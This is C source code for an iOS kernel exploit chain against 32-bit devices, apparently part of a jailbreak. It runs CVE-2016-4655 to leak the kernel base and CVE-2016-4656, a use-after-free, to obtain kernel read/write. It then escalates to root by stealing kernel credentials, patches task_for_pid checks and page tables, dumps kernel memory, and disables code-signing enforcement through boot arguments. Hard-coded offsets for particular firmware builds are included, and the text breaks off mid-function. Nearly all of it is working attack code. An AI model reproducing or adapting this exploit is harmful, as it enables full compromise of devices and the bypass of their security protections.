#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <assert.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/syscall.h>
#include <sys/kauth.h>
#include <sys/mount.h>
#include <sys/utsname.h>
#include <spawn.h>
#include <fcntl.h>
#include <pthread.h>

#include <mach/mach.h>
#include <IOKit/IOKitLib.h>

#include "patchfinder.h"

#define NEWFILE  (O_WRONLY|O_SYNC)
#define CONSOLE "/dev/console"

#define PAYLOAD_TO_PEXPLOIT (-76)
#define PEXPLOIT_TO_UAF_PAYLOAD 8
#define kOSSerializeBinarySignature "\323\0\0"
#define WRITE_IN(buf, data) do { *(uint32_t *)(buf+bufpos) = (data); bufpos+=4; } while(0)

#define TTB_SIZE            4096
#define L1_SECT_S_BIT       (1 << 16)
#define L1_SECT_PROTO       (1 << 1)        /* 0b10 */
#define L1_SECT_AP_URW      (1 << 10) | (1 << 11)
#define L1_SECT_APX         (1 << 15)
#define L1_SECT_DEFPROT     (L1_SECT_AP_URW | L1_SECT_APX)
#define L1_SECT_SORDER      (0)            /* 0b00, not cacheable, strongly ordered. */
#define L1_SECT_DEFCACHE    (L1_SECT_SORDER)
#define L1_PROTO_TTE(entry) (entry | L1_SECT_S_BIT | L1_SECT_DEFPROT | L1_SECT_DEFCACHE)
#define L1_PAGE_PROTO       (1 << 0)
#define L1_COARSE_PT        (0xFFFFFC00)
#define PT_SIZE             256
#define L2_PAGE_APX         (1 << 9)

#define CHUNK_SIZE 0x800

char *lockfile;
int fd;
int fildes[2];
uint32_t cpipe;
uint32_t pipebuf;
clock_serv_t clk_battery;
clock_serv_t clk_realtime;
unsigned char pExploit[128];
vm_offset_t vm_kernel_addrperm;
uint32_t write_gadget;

uint32_t* offsets = NULL;

uint32_t tte_virt;
uint32_t tte_phys;
uint32_t flush_dcache;
uint32_t invalidate_tlb;

const char *lock_last_path_component = "/tmp/.lock";

kern_return_t io_service_open_extended(mach_port_t service, task_t owningTask, uint32_t connect_type, NDR_record_t ndr, io_buf_ptr_t properties, mach_msg_type_number_t propertiesCnt, kern_return_t *result, mach_port_t *connection);
kern_return_t io_registry_entry_get_properties(mach_port_t registry_entry, io_buf_ptr_t *properties, mach_msg_type_number_t *propertiesCnt);
kern_return_t io_service_get_matching_services_bin(mach_port_t master_port, io_struct_inband_t matching, mach_msg_type_number_t matchingCnt, mach_port_t *existing);
kern_return_t clock_get_attributes(clock_serv_t clock_serv, clock_flavor_t flavor, clock_attr_t clock_attr, mach_msg_type_number_t *clock_attrCnt);

kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, mach_vm_address_t data, mach_vm_size_t *outsize);
kern_return_t mach_vm_write(vm_map_t target_task, mach_vm_address_t address, vm_offset_t data, mach_msg_type_number_t dataCnt);

mach_port_t tfp0;
int isIOS9=0;

void copyin(void* to, uint32_t from, size_t size) {
    mach_vm_size_t outsize = size;
    size_t szt = size;
    if (size > 0x1000) {
        size = 0x1000;
    }
    size_t off = 0;
    while (1) {
        mach_vm_read_overwrite(tfp0, off+from, size, (mach_vm_offset_t)(off+to), &outsize);
        szt -= size;
        off += size;
        if (szt == 0) {
            break;
        }
        size = szt;
        if (size > 0x1000) {
            size = 0x1000;
        }
        
    }
}

void copyout(uint32_t to, void* from, size_t size) {
    mach_vm_write(tfp0, to, (vm_offset_t)from, (mach_msg_type_number_t)size);
}

uint32_t read_primitive_byte_tfp0(uint32_t addr) {
    uint8_t val = 0;
    copyin(&val, addr, 1);
    return val;
}

uint32_t write_primitive_byte_tfp0(uint32_t addr, uint8_t val) {
    copyout(addr, &val, 1);
    return val;
}

uint32_t read_primitive_word_tfp0(uint32_t addr) {
    uint16_t val = 0;
    copyin(&val, addr, 2);
    return val;
}

uint32_t write_primitive_word_tfp0(uint32_t addr, uint16_t val) {
    copyout(addr, &val, 2);
    return val;
}

uint32_t read_primitive_dword_tfp0(uint32_t addr) {
    uint32_t val = 0;
    copyin(&val, addr, 4);
    return val;
}

uint32_t write_primitive_dword_tfp0(uint32_t addr, uint32_t val) {
    copyout(addr, &val, 4);
    return val;
}

enum
{
    kOSSerializeDictionary   = 0x01000000U,
    kOSSerializeArray        = 0x02000000U,
    kOSSerializeSet          = 0x03000000U,
    kOSSerializeNumber       = 0x04000000U,
    kOSSerializeSymbol       = 0x08000000U,
    kOSSerializeString       = 0x09000000U,
    kOSSerializeData         = 0x0a000000U,
    kOSSerializeBoolean      = 0x0b000000U,
    kOSSerializeObject       = 0x0c000000U,
    kOSSerializeTypeMask     = 0x7F000000U,
    kOSSerializeDataMask     = 0x00FFFFFFU,
    kOSSerializeEndCollecton = 0x80000000U,
};

unsigned char clock_ops_overwrite[] = {
    0x00, 0x00, 0x00, 0x00, // [00] (rtclock.getattr): address of OSSerializer::serialize (+1)
    0x00, 0x00, 0x00, 0x00, // [04] (calend_config): NULL
    0x00, 0x00, 0x00, 0x00, // [08] (calend_init): NULL
    0x00, 0x00, 0x00, 0x00, // [0C] (calend_gettime): address of calend_gettime (+1)
    0x00, 0x00, 0x00, 0x00, // [10] (calend_getattr): address of _bufattr_cpx (+1)
};


unsigned char uaf_payload_buffer[] = {
    0x00, 0x00, 0x00, 0x00, // [00] ptr to clock_ops_overwrite buffer
    0x00, 0x00, 0x00, 0x00, // [04] address of clock_ops array in kern memory
    0x00, 0x00, 0x00, 0x00, // [08] address of _copyin
    0x00, 0x00, 0x00, 0x00, // [0C] NULL
    0x00, 0x00, 0x00, 0x00, // [10] address of OSSerializer::serialize (+1)
    0x00, 0x00, 0x00, 0x00, // [14] address of "BX LR" code fragment
    0x00, 0x00, 0x00, 0x00, // [18] NULL
    0x00, 0x00, 0x00, 0x00, // [1C] address of OSSymbol::getMetaClass (+1)
    0x00, 0x00, 0x00, 0x00, // [20] address of "BX LR" code fragment
    0x00, 0x00, 0x00, 0x00, // [24] address of "BX LR" code fragment
};


enum koffsets {
    offsetof_OSSerializer_serialize,   // OSSerializer::serialize
    offsetof_OSSymbol_getMetaClass,    // OSSymbol::getMetaClass
    offsetof_calend_gettime,           // calend_gettime
    offsetof_bufattr_cpx,              // _bufattr_cpx
    offsetof_clock_ops,                // clock_ops
    offsetof_copyin,                   // _copyin
    offsetof_bx_lr,                    // BX LR
    offsetof_write_gadget,             // write_gadget: str r1, [r0, #0xc] , bx lr
    offsetof_vm_kernel_addrperm,       // vm_kernel_addrperm
    offsetof_kernel_pmap,              // kernel_pmap
    offsetof_flush_dcache,             // flush_dcache
    offsetof_invalidate_tlb,           // invalidate_tlb
    offsetof_task_for_pid,             // task_for_pid
    offsetof_pid_check,                // pid_check_addr offset
    offsetof_posix_check,              // posix_check_ret_addr offset
    offsetof_mac_proc_check,           // mac_proc_check_ret_addr offset
    offsetof_allproc,                  // allproc
    offsetof_p_pid,                  // proc_t::p_pid
    offsetof_p_ucred,                // proc_t::p_ucred
};

uint32_t koffsets_S5L8950X_12H321[] = {
    0x2d9864,   // OSSerializer::serialize
    0x2db984,   // OSSymbol::getMetaClass
    0x1d300,    // calend_gettime
    0xc65f4,    // _bufattr_cpx
    0x3b1cdc,   // clock_ops
    0xb386c,    // _copyin
    0xc65f6,    // BX LR
    0xb35a8,    // write_gadget: str r1, [r0, #0xc] , bx lr
    0x3f8258,   // vm_kernel_addrperm
    0x3a711c,   // kernel_pmap
    0xa7758,    // flush_dcache
    0xb3600,    // invalidate_tlb
    0x2c05c8,   // task_for_pid
    0x16,       // pid_check_addr offset
    0x3e,       // posix_check_ret_addr offset
    0x222,      // mac_proc_check_ret_addr offset
    0x3f9970,   // allproc
    0x8,        // proc_t::p_pid
    0x8c,       // proc_t::p_ucred
};

uint32_t koffsets_S5L8950X_13A452[] = {
    0x31e7bc,   // OSSerializer::serialize
    0x320f00,   // OSSymbol::getMetaClass
    0x1e718,    // calend_gettime
    0xde9fc,    // _bufattr_cpx
    0x40a3cc,   // clock_ops
    0xcb87c,    // _copyin
    0xde9fe,    // BX LR
    0xcb5a8,    // write_gadget: str r1, [r0, #0xc] , bx lr
    0x45c0c4,   // vm_kernel_addrperm
    0x3fd444,   // kernel_pmap
    0xbf5ac,    // flush_dcache
    0xcb600,    // invalidate_tlb
    0x302bdc,   // task_for_pid
    0x18,       // pid_check_addr offset
    0x40,       // posix_check_ret_addr offset
    0x224,      // mac_proc_check_ret_addr offset
    0x45d9b0,   // allproc
    0x8,        // proc_t::p_pid
    0x8c,       // proc_t::p_ucred
};

uint32_t koffset(enum koffsets offset){
    if (offsets == NULL) {
        return 0;
    }
    return offsets[offset];
}

void offsets_init(void){
    struct utsname u = { 0 };
    uname(&u);
    
    printf("kern.version: %s\n", u.version);
    
    if (strcmp(u.version, "Darwin Kernel Version 14.0.0: Wed Aug  5 19:24:44 PDT 2015; root:xnu-2784.40.6~18/RELEASE_ARM_S5L8950X") == 0) {
        printf("S5L8950X: 12H321\n");
        offsets = koffsets_S5L8950X_12H321;
    }
    
    if (strcmp(u.version, "Darwin Kernel Version 15.0.0: Thu Aug 20 13:11:13 PDT 2015; root:xnu-3248.1.3~1/RELEASE_ARM_S5L8950X") == 0) {
        printf("S5L8950X: 13A452\n");
        offsets = koffsets_S5L8950X_13A452;
        isIOS9 = 1;
    }
}

void init(void){
    
#ifdef UNTETHER
    int fd;
    fd = open(CONSOLE,NEWFILE,0644);
    if(fd<0){
        perror(CONSOLE);
    }
    close(1);
    close(2);
    if(dup2(fd, 1) < 0){
        perror("dup");
    }
    if(dup2(fd, 2) < 0){
        perror("dup");
    }
    close(fd);
    
    printf("\n");
#endif
    
}

void initialize(void) {
    kern_return_t kr;
    
    lockfile = malloc(strlen(lock_last_path_component) + 1);
    assert(lockfile);
    
    strcpy(lockfile, lock_last_path_component);
    
    fd = open(lockfile, O_CREAT | O_WRONLY, 0644);
    assert(fd != -1);
    
    flock(fd, LOCK_EX);
    
    assert(pipe(fildes) != -1);
    
    kr = host_get_clock_service(mach_host_self(), CALENDAR_CLOCK, &clk_battery);
    if (kr != KERN_SUCCESS) {
        printf("[-] err: %d\n", err_get_code(kr));
    }
    
    kr = host_get_clock_service(mach_host_self(), REALTIME_CLOCK, &clk_realtime);
    if (kr != KERN_SUCCESS) {
        printf("[-] err: %d\n", err_get_code(kr));
    }
}


// CVE-2016-4655
uint32_t leak_kernel_base(void){
    
    printf("[*] running CVE-2016-4655\n");
    
    char data[4096];
    uint32_t bufpos = 0;
    
    memcpy(data, kOSSerializeBinarySignature, sizeof(kOSSerializeBinarySignature));
    bufpos += sizeof(kOSSerializeBinarySignature);
    
    WRITE_IN(data, kOSSerializeDictionary | kOSSerializeEndCollecton | 2);
    
    WRITE_IN(data, kOSSerializeSymbol | 30);
    WRITE_IN(data, 0x4b444948); // "HIDKeyboardModifierMappingSrc"
    WRITE_IN(data, 0x6f627965);
    WRITE_IN(data, 0x4d647261);
    WRITE_IN(data, 0x6669646f);
    WRITE_IN(data, 0x4d726569);
    WRITE_IN(data, 0x69707061);
    WRITE_IN(data, 0x7253676e);
    WRITE_IN(data, 0x00000063);
    WRITE_IN(data, kOSSerializeNumber | 2048);
    WRITE_IN(data, 0x00000004);
    WRITE_IN(data, 0x00000000);
    
    WRITE_IN(data, kOSSerializeSymbol | 30);
    WRITE_IN(data, 0x4b444948); // "HIDKeyboardModifierMappingDst"
    WRITE_IN(data, 0x6f627965);
    WRITE_IN(data, 0x4d647261);
    WRITE_IN(data, 0x6669646f);
    WRITE_IN(data, 0x4d726569);
    WRITE_IN(data, 0x69707061);
    WRITE_IN(data, 0x7344676e);
    WRITE_IN(data, 0x00000074);
    WRITE_IN(data, kOSSerializeNumber | kOSSerializeEndCollecton | 32);
    WRITE_IN(data, 0x00000193);
    WRITE_IN(data, 0X00000000);
    
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("AppleKeyStore"));
    io_connect_t connection;
    kern_return_t result;
    
    io_service_open_extended(service, mach_task_self(), 0, NDR_record, data, bufpos, &result, &connection);
    if (result != KERN_SUCCESS) {
        printf("[-] err: %d\n", err_get_code(result));
    }
    
    io_object_t object = 0;
    uint32_t size = sizeof(data);
    io_iterator_t iterator;
    IORegistryEntryGetChildIterator(service, "IOService", &iterator);
    
    do {
        if (object) {
            IOObjectRelease(object);
        }
        object = IOIteratorNext(iterator);
    } while (IORegistryEntryGetProperty(object, "HIDKeyboardModifierMappingSrc", data, &size));
    
    if (size > 8) {
        int i;
        for (i=0; i<size; i++) {
            if (i % 4 == 0) {
                //printf("\n");
            }
            //printf("%02x ", (unsigned char)data[i]);
        }
        //printf("\n");
        
        return (*(uint32_t *)(data+36) & 0xFFF00000) + 0x1000;
    }
    return 0;
}

void *insert_payload(void *ptr) {
    char stackAnchor;
    uint32_t bufpos; // unsigned int size;
    char buffer[4096];
    int v26;
    mach_port_t connection;
    kern_return_t result;
    mach_port_t masterPort;
    
    char *p = (char *)((unsigned int)&stackAnchor & 0xFFFFF000);
    // kauth_filesec.fsec_magic
    *(uint32_t *)(p + 0xEC0) = 0x12CC16D;
    // kauth_filesec.fsec_acl.entrycount = KAUTH_FILESEC_NOACL
    *(uint32_t *)(p + 0xEE4) = -1;
    // kauth_filesec.fsec_acl.acl_ace[...]
    memcpy((void *)(((unsigned int)&stackAnchor & 0xFFFFF000) | 0xEEC), pExploit, 128);
    
    memcpy(buffer, kOSSerializeBinarySignature, sizeof(kOSSerializeBinarySignature));
    bufpos = sizeof(kOSSerializeBinarySignature);
    
    WRITE_IN(buffer, kOSSerializeDictionary | kOSSerializeEndCollecton | 2);
    
    WRITE_IN(buffer, kOSSerializeSymbol | 128);
    // "ararararararararararararararararararararararararararararararararararararararararararararararararararararararararararararararara"
    for (v26=0; v26<124; v26+=4) {
        WRITE_IN(buffer, 0x72617261);
    }
    WRITE_IN(buffer, 0x00617261);
    WRITE_IN(buffer, kOSSerializeNumber | 2048);
    WRITE_IN(buffer, 0x00000004);
    WRITE_IN(buffer, 0X00000000);
    
    WRITE_IN(buffer, kOSSerializeSymbol | 30);
    WRITE_IN(buffer, 0x4b444948); // "HIDKeyboardModifierMappingDst"
    WRITE_IN(buffer, 0x6f627965);
    WRITE_IN(buffer, 0x4d647261);
    WRITE_IN(buffer, 0x6669646f);
    WRITE_IN(buffer, 0x4d726569);
    WRITE_IN(buffer, 0x69707061);
    WRITE_IN(buffer, 0x7344676e);
    WRITE_IN(buffer, 0x00000074);
    WRITE_IN(buffer, kOSSerializeNumber | kOSSerializeEndCollecton | 32);
    WRITE_IN(buffer, 0x00000193);
    WRITE_IN(buffer, 0x00000000);
    
    masterPort = kIOMasterPortDefault;
    
    io_service_t service = IOServiceGetMatchingService(masterPort, IOServiceMatching("AppleKeyStore"));
    
    io_service_open_extended(service, mach_task_self(), 0, NDR_record, buffer, bufpos, &result, &connection);
    if (result != KERN_SUCCESS) {
        printf("[-] err: %d\n", err_get_code(result));
    }
    
    io_object_t object = 0;
    uint32_t size = sizeof(buffer);
    io_iterator_t iterator;
    IORegistryEntryGetChildIterator(service, "IOService", &iterator);
    uint32_t *args = (uint32_t *)ptr;
    uint32_t kernel_base = *args;
    uint32_t payload_ptr = 0;
    
    do {
        if (object) {
            IOObjectRelease(object);
        }
        object = IOIteratorNext(iterator);
    } while (IORegistryEntryGetProperty(object, "ararararararararararararararararararararararararararararararararararararararararararararararararararararararararararararararara", buffer, &size));
    
    if (size > 8) {
        int i;
        for (i=0; i<size; i++) {
            if (i % 4 == 0) {
                //printf("\n");
            }
            //printf("%02x ", (unsigned char)buffer[i]);
        }
        //printf("\n");
        payload_ptr = *(uint32_t *)(buffer+16);
    }
    
    *(uint32_t *)clock_ops_overwrite = kernel_base + koffset(offsetof_OSSerializer_serialize) + 1;
    *(uint32_t *)(clock_ops_overwrite+0xC) = kernel_base + koffset(offsetof_calend_gettime) + 1;
    *(uint32_t *)(clock_ops_overwrite+0x10) = kernel_base + koffset(offsetof_bufattr_cpx) + 1;
    
    *(uint32_t *)uaf_payload_buffer = (uint32_t)clock_ops_overwrite;
    *(uint32_t *)(uaf_payload_buffer+0x4) = kernel_base + koffset(offsetof_clock_ops);
    *(uint32_t *)(uaf_payload_buffer+0x8) = kernel_base + koffset(offsetof_copyin);
    *(uint32_t *)(uaf_payload_buffer+0x10) = kernel_base + koffset(offsetof_OSSerializer_serialize) + 1;
    *(uint32_t *)(uaf_payload_buffer+0x14) = kernel_base + koffset(offsetof_bx_lr);
    *(uint32_t *)(uaf_payload_buffer+0x1C) = kernel_base + koffset(offsetof_OSSymbol_getMetaClass) + 1;
    *(uint32_t *)(uaf_payload_buffer+0x20) = kernel_base + koffset(offsetof_bx_lr);
    *(uint32_t *)(uaf_payload_buffer+0x24) = kernel_base + koffset(offsetof_bx_lr);
    
    memcpy(pExploit+PEXPLOIT_TO_UAF_PAYLOAD, uaf_payload_buffer, sizeof(uaf_payload_buffer));
    memcpy(pExploit+PEXPLOIT_TO_UAF_PAYLOAD+sizeof(uaf_payload_buffer), clock_ops_overwrite, sizeof(clock_ops_overwrite));
    
    // kauth_filesec.fsec_acl.acl_ace[...]
    memcpy((void *)(((unsigned int)&stackAnchor & 0xFFFFF000) | 0xEEC), pExploit, 128);
    *(uint32_t *)(args[1]) = payload_ptr;
    
    int ret = syscall(SYS_open_extended, lockfile, O_WRONLY | O_EXLOCK, KAUTH_UID_NONE, KAUTH_GID_NONE, 0644, p + 0xEC0);
    assert(ret != -1);
    return NULL;
}

void exec_primitive(uint32_t fct, uint32_t arg1, uint32_t arg2) {
    int attr;
    unsigned int attrCnt;
    char data[64];
    
    write(fildes[1], "AAAABBBB", 8);
    write(fildes[1], &arg1, 4);
    write(fildes[1], &arg2, 4);
    write(fildes[1], &fct, 4);
    clock_get_attributes(clk_realtime, pipebuf, &attr, &attrCnt);
    
    read(fildes[0], data, 64);
}

uint32_t read_primitive(uint32_t addr) {
    int attr;
    unsigned int attrCnt;
    
    return clock_get_attributes(clk_battery, addr, &attr, &attrCnt);
}

void write_primitive(uint32_t addr, uint32_t value) {
    addr -= 0xc;
    exec_primitive(write_gadget, addr, value);
}

void patch_page_table(int hasTFP0, uint32_t tte_virt, uint32_t tte_phys, uint32_t flush_dcache, uint32_t invalidate_tlb, uint32_t page) {
    uint32_t i = page >> 20;
    uint32_t j = (page >> 12) & 0xFF;
    uint32_t addr = tte_virt+(i<<2);
    uint32_t entry = hasTFP0 == 0 ? read_primitive_dword_tfp0(addr) : read_primitive(addr);
    if ((entry & L1_PAGE_PROTO) == L1_PAGE_PROTO) {
        uint32_t page_entry = ((entry & L1_COARSE_PT) - tte_phys) + tte_virt;
        uint32_t addr2 = page_entry+(j<<2);
        uint32_t entry2 = hasTFP0 == 0 ? read_primitive_dword_tfp0(addr2) : read_primitive(addr2);
        if (entry2) {
            uint32_t new_entry2 = (entry2 & (~L2_PAGE_APX));
            hasTFP0 == 0 ? write_primitive_dword_tfp0(addr2, new_entry2) : write_primitive(addr2, new_entry2);
        }
    } else if ((entry & L1_SECT_PROTO) == L1_SECT_PROTO) {
        uint32_t new_entry = L1_PROTO_TTE(entry);
        new_entry &= ~L1_SECT_APX;
        hasTFP0 == 0 ? write_primitive_dword_tfp0(addr, new_entry) : write_primitive(addr, new_entry);
    }
    
    exec_primitive(flush_dcache, 0, 0);
    exec_primitive(invalidate_tlb, 0, 0);
    
}

void do_exploit(uint32_t kernel_base){
    printf("[*] running CVE-2016-4656\n");
    
    pthread_t insert_payload_thread;
    volatile uint32_t payload_ptr = 0x12345678;
    uint32_t args[] = {kernel_base, (uint32_t)&payload_ptr};
    
    char data[4096];
    uint32_t bufpos = 0;
    mach_port_t master = 0, res;
    kern_return_t kr;
    struct stat buf;
    mach_port_name_t kernel_task;
    
    int r = pthread_create(&insert_payload_thread, NULL, &insert_payload, args);
    assert(r == 0);
    
    while (payload_ptr == 0x12345678);
    printf("[*] payload ptr: %p\n", (void *)payload_ptr);
    
    // CVE-2016-4656
    memcpy(data, kOSSerializeBinarySignature, sizeof(kOSSerializeBinarySignature));
    bufpos += sizeof(kOSSerializeBinarySignature);
    
    WRITE_IN(data, kOSSerializeDictionary | kOSSerializeEndCollecton | 0x10);
    
    {
        /* pre-9.1 doesn't accept strings as keys, but duplicate keys :D */
        WRITE_IN(data, kOSSerializeSymbol | 4);
        WRITE_IN(data, 0x00327973);                 // "sy2"
        /* our key is a OSString object that will be freed */
        WRITE_IN(data, kOSSerializeString | 4);
        WRITE_IN(data, 0x00327973);                 // irrelevant
        
        /* now this will free the string above */
        WRITE_IN(data, kOSSerializeObject | 1);     // ref to "sy2"
        WRITE_IN(data, kOSSerializeBoolean | 1);    // lightweight value
        
        /* and this is the key for the value below */
        WRITE_IN(data, kOSSerializeObject | 1);     // ref to "sy2" again
    }
    
    WRITE_IN(data, kOSSerializeData | 0x14);
    WRITE_IN(data, payload_ptr+PAYLOAD_TO_PEXPLOIT+PEXPLOIT_TO_UAF_PAYLOAD);    // [00] address of uaf_payload_buffer
    WRITE_IN(data, 0x41414141);                                                 // [04] dummy
    WRITE_IN(data, payload_ptr+PAYLOAD_TO_PEXPLOIT);                            // [08] address of uaf_payload_buffer - 8
    WRITE_IN(data, 0x00000014);                                                 // [0C] static value of 20
    WRITE_IN(data, kernel_base + koffset(offsetof_OSSerializer_serialize) +1);  // [10] address of OSSerializer::serialize (+1)
    
    /* now create a reference to object 1 which is the OSString object that was just freed */
    WRITE_IN(data, kOSSerializeObject | kOSSerializeEndCollecton | (1 ? 2 : 1));
    
    /* get a master port for IOKit API */
    host_get_io_master(mach_host_self(), &master);
    
    /* trigger the bug */
    kr = io_service_get_matching_services_bin(master, data, bufpos, &res);
    printf("[*] kr: %x\n", kr);
    
    /* test read primitive */
    assert(read_primitive(kernel_base) == 0xfeedface);
    vm_kernel_addrperm = read_primitive(kernel_base + koffset(offsetof_vm_kernel_addrperm));

    /* pipe test */
    assert(fstat(fildes[0], &buf) != -1);
    cpipe = (uint32_t)(buf.st_ino - vm_kernel_addrperm);
    
    write(fildes[1], "ABCDEFGH", 8);
    assert(read_primitive(cpipe) == 8);
    pipebuf = read_primitive(cpipe+16);
    assert(read_primitive(pipebuf) == 0x44434241); // "ABCD"
    assert(read_primitive(pipebuf+4) == 0x48474645); // "EFGH"
    
    read(fildes[0], data, 4096);
    
    /* test write primitive */
    write_gadget = kernel_base + koffset(offsetof_write_gadget);
    
    write_primitive(pipebuf, 0x41424142);
    assert(read_primitive(pipebuf) == 0x41424142);
    
    /* find kernel pmap */
    uint32_t kernel_pmap = koffset(offsetof_kernel_pmap) + kernel_base;
    uint32_t kernel_pmap_store = read_primitive(kernel_pmap);
    tte_virt = read_primitive(kernel_pmap_store);
    tte_phys = read_primitive(kernel_pmap_store+4);
    flush_dcache = koffset(offsetof_flush_dcache) + kernel_base;
    invalidate_tlb = koffset(offsetof_invalidate_tlb) + kernel_base;
    printf("[OF] kernel pmap: %08x\n", kernel_pmap);
    printf("[*] kernel pmap store: %08x\n", kernel_pmap_store);
    printf("[*] tte_virt: %08x\n", tte_virt);
    printf("[*] tte_phys: %08x\n", tte_phys);
    
    pid_t uid = getuid();
    if(uid != 0){
        // elevation to root privilege by xerub
        uint32_t kproc = 0;
        uint32_t myproc = 0;
        uint32_t mycred = 0;
        pid_t mypid = getpid();
        pid_t myuid = getuid();
        uint32_t proc = read_primitive(kernel_base + koffset(offsetof_allproc));
        while (proc) {
            uint32_t pid = read_primitive(proc + koffset(offsetof_p_pid));
            if (pid == mypid) {
                myproc = proc;
            } else if (pid == 0) {
                kproc = proc;
            }
            proc = read_primitive(proc);
        }
        mycred = read_primitive(myproc + koffset(offsetof_p_ucred));
        uint32_t kcred = read_primitive(kproc + koffset(offsetof_p_ucred));
        write_primitive(myproc + koffset(offsetof_p_ucred), kcred);
        setuid(0);
        printf("[*] I am god?: %x\n", getuid());
    }
    
    
    /* task_for_pid */
    uint32_t task_for_pid_base = koffset(offsetof_task_for_pid) + kernel_base;
    uint32_t pid_check_addr = koffset(offsetof_pid_check) + task_for_pid_base;
    printf("[OF] pid_check_addr: %08x\n", pid_check_addr);
    
    uint32_t pid_check_val = read_primitive(pid_check_addr);
    pid_check_val |= 0xff;
    
    patch_page_table(1, tte_virt, tte_phys, flush_dcache, invalidate_tlb, pid_check_addr & ~0xFFF);
    write_primitive(pid_check_addr, pid_check_val); // cmp r6, #ff
    
    uint32_t posix_check_ret_addr;
    uint32_t posix_check_ret_val;
    uint32_t mac_proc_check_ret_addr;
    uint32_t mac_proc_check_ret_val;
    if(uid != 0){
        uint32_t posix_check_ret_addr = koffset(offsetof_posix_check) + task_for_pid_base;
        uint32_t posix_check_ret_val = read_primitive(posix_check_ret_addr);
        patch_page_table(1, tte_virt, tte_phys, flush_dcache, invalidate_tlb, posix_check_ret_addr & ~0xFFF);
        write_primitive(posix_check_ret_addr, posix_check_ret_val + 0xff); // cmp r0, #ff
        
        uint32_t mac_proc_check_ret_addr = koffset(offsetof_mac_proc_check) + task_for_pid_base;
        uint32_t mac_proc_check_ret_val = read_primitive(mac_proc_check_ret_addr);
        patch_page_table(1, tte_virt, tte_phys, flush_dcache, invalidate_tlb, mac_proc_check_ret_addr & ~0xFFF);
        write_primitive(mac_proc_check_ret_addr, mac_proc_check_ret_val | 0x10000); // cmp.w r8, #1
    }
    
    exec_primitive(flush_dcache, 0, 0);
    
    usleep(100000);
    
    task_for_pid(mach_task_self(), 0, &kernel_task);
    tfp0 = kernel_task;
    
    if(uid != 0){
        write_primitive_dword_tfp0(posix_check_ret_addr, posix_check_ret_val);
        write_primitive_dword_tfp0(mac_proc_check_ret_addr, mac_proc_check_ret_val);
        exec_primitive(flush_dcache, 0, 0);
    }
    
}

void dump_kernel(vm_address_t kernel_base, uint8_t *dest, size_t ksize) {
    for (vm_address_t addr = kernel_base, e = 0; addr < kernel_base + ksize; addr += CHUNK_SIZE, e += CHUNK_SIZE) {
        pointer_t buf = 0;
        vm_address_t sz = 0;
        vm_read(tfp0, addr, CHUNK_SIZE, &buf, &sz);
        if (buf == 0 || sz == 0)
            continue;
        bcopy((uint8_t *)buf, dest + e, CHUNK_SIZE);
    }
}

void patch_bootargs(uint32_t addr){
    //printf("set bootargs\n");
    uint32_t bootargs_addr = read_primitive_dword_tfp0(addr) + 0x38;
    const char* new_bootargs = "cs_enforcement_disable=1 amfi_get_out_of_my_way=1";
    
    // evasi0n6
    size_t new_bootargs_len = strlen(new_bootargs) + 1;
    size_t bootargs_buf_len = (new_bootargs_len + 3) / 4 * 4;
    char bootargs_buf[bootargs_buf_len];
    
    strlcpy(bootargs_buf, new_bootargs, bootargs_buf_len);
    memset(bootargs_buf + new_bootargs_len, 0, bootargs_buf_len - new_bootargs_len);
    copyout(bootargs_addr, bootargs_buf, bootargs_buf_len);
}

// sandbox stuff
// by xerub's iloader
unsigned int
make_b_w(int pos, int tgt)
{
    int delta;
    unsigned int i;
    unsigned short pfx;
    unsigned short sfx;
    
    unsigned int omask_1k = 0xB800;
    unsigned int omask_2k = 0xB000;
    unsigned int omask_3k = 0x9800;
    unsigned int omask_4k = 0x9000;
    
    unsigned int amask = 0x7FF;
    int range;
    
    range = 0x400000;
    
    delta = tgt - pos - 4; /* range: 0x400000 */
    i = 0;
    if(tgt > pos) i = tgt - pos - 4;
    if(tgt < pos) i = pos - tgt - 4;
    
    if (i < range){
        pfx = 0xF000 | ((delta >> 12) & 0x7FF);
        sfx =  omask_1k | ((delta >>  1) & amask);
        
        return (unsigned int)pfx | ((unsigned int)sfx << 16);
    }
    
    if (range < i && i < range*2){ // range: 0x400000-0x800000
        delta -= range;
        pfx = 0xF000 | ((delta >> 12) & 0x7FF);
        sfx =  omask_2k | ((delta >>  1) & amask);
        
        return (unsigned int)pfx | ((unsigned int)sfx << 16);
    }
    
    if (range*2 < i && i < range*3){ // range: 0x800000-0xc000000
        delta -= range*2;
        pfx = 0xF000 | ((delta >> 12) & 0x7FF);
        sfx =  omask_3k | ((delta >>  1) & amask);
        
        return (unsigned int)pfx | ((unsigned int)sfx << 16);
    }
    
    if (range*3 < i && i < range*4){ // range: 0xc00000-0x10000000
        delta -= range*3;
        pfx = 0xF000 | ((delta >> 12) & 0x7FF);
        sfx =  omask_4k | ((delta >>  1) & amask);
        return (unsigned int)pfx | ((unsigned int)sfx << 16);
    }
    
    return -1;
}

unsigned int
make_bl(int pos, int tgt)
{
    int delta;
    unsigned short pfx;
    unsigned short sfx;
    
    unsigned int omask = 0xF800;
    unsigned int amask = 0x07FF;
    
    delta = tgt - pos - 4; /* range: 0x400000 */
    pfx = 0xF000 | ((delta >> 12) & 0x7FF);
    sfx =  omask | ((delta >>  1) & amask);
    
    return (unsigned int)pfx | ((unsigned int)sfx << 16);
}

void unjail8(uint32_t kbase){
    printf("[*] jailbreaking...\n");
    
    printf("[*] running kdumper\n");
    size_t ksize = 0xFFE000;
    void *kdata = malloc(ksize);
    dump_kernel(kbase, kdata, ksize);
    
    /* patchfinder */
    printf("[*] running patchfinder\n");
    uint32_t proc_enforce = kbase + find_proc_enforce(kbase, kdata, ksize);
    uint32_t cs_enforcement_disable_amfi = kbase + find_cs_enforcement_disable_amfi(kbase, kdata, ksize);
    uint32_t PE_i_can_has_debugger_1 = kbase + find_i_can_has_debugger_1(kbase, kdata, ksize);
    uint32_t PE_i_can_has_debugger_2 = kbase + find_i_can_has_debugger_2(kbase, kdata, ksize);
    uint32_t p_bootargs = kbase + find_p_bootargs(kbase, kdata, ksize);
    uint32_t vm_map_enter = kbase + find_vm_map_enter_patch(kbase, kdata, ksize);
    uint32_t vm_map_protect = kbase + find_vm_map_protect_patch(kbase, kdata, ksize);
    uint32_t mount_patch = kbase + find_mount(kbase, kdata, ksize) + 1;
